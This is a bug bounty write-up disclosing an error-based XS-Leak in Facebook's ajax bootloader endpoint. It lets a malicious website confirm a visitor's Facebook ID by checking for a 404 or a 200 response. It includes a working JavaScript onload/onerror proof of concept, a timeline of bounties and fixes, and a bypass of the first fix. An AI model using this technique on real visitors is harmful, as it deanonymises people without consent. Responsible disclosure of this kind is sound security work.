---
title: XSLEAKS error-based lead to disclose the visitor Facebook ID
date: 2021-06-24 13:00:24 +0800
categories: [Bug-Bounty, Writeup]
tags: [facebook]
---

# Description

The ajax bootloader endpoint (https://web.facebook.com/ajax/bootloader-endpoint/), is used to load react modules. An error-based xsleaks happen in this endpoint when all the get parameter is removed except the __user and __a=1 (https://web.facebook.com/ajax/bootloader-endpoint/?__user=USERID&__a=1). This endpoint will return 404 status code if the __user parameter value match with the logged in user id and will return 200 if its not match. It is possible to detect these 2 state (404 and 200 status code) using onload and onerror event. making an attacker to detect whether the target user is visited the attacker controlled webpage.

# Impact

This endpoint could have let a malicious website determine which Facebook user was visiting them due to XSLeaks.

# FBDL Run
```
    [setup]
    User UserOne
    User UserTwo

    Results:
    UserOne => 100066013862573
    UserTwo => 100065449647222
```
# Steps to reproduce 

1. Log in to Facebook as UserOne
2. Open other website (e.g https://google.com)
2. Open the browser console (Right Click -> Inspect Element -> Console Tab)
3. Copy paste this script to the console :

```javascript
    var id = '100066013862573' // UserOne ID
    var script = document.createElement('script');
    script.src = `https://web.facebook.com/ajax/bootloader-endpoint/?__user=${id}&__a=1`
    script.onload = () => console.log('Nope');
    script.onerror = e => console.log('Match');
    document.head.appendChild(script);
```

This should print "Match" in the console.

## Reference 

1. https://hackerone.com/reports/505424

# Timeline

- Apr 07, 2021 - Report sent
- Apr 12, 2021 - Triaged
- Jun 24, 2021 - Fixed
- Jun 24, 2021 - Bounty awarded $1250
- Jun 27, 2021 - Send information that the fix can be bypass and open a new report (1)
- Jun 29, 2021 - Triaged (new report)
- Jul 23, 2021 - Bounty awarded $1313 (Including Bonus)
- Jul 24, 2021 - Fixed

> 1. The fix can be bypass by adding a non numeric character in the last __user parameter value
> __user=1001 -> __user=1001a
{: .prompt-info }

